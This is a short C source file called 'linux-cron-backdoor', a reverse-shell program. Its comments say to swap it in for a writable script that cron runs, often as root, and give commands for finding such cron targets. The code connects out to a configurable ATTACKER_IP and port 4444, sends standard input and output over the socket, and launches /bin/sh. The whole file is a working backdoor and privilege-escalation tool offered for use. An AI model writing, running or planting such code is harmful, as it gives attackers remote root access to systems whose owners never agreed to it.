#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/*
 * linux-cron-backdoor - Cron Job Reverse Shell
 *
 * Replace a writable cron-executed script/binary with this.
 * When the cron job fires (often as root), you get a shell.
 *
 * Find targets:
 *   grep "CRON" /var/log/syslog
 *   crontab -l
 *   ls /etc/cron.*
 *
 */

// -- CONFIGURE THESE --------------------------------------
#define ATTACKER_IP   "10.10.10.10"
#define ATTACKER_PORT  4444
// ---------------------------------------------------------

int main(void) {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    server.sin_port = htons(ATTACKER_PORT);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        return 1;
    }

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execve("/bin/sh", NULL, NULL);
    return 0;
}
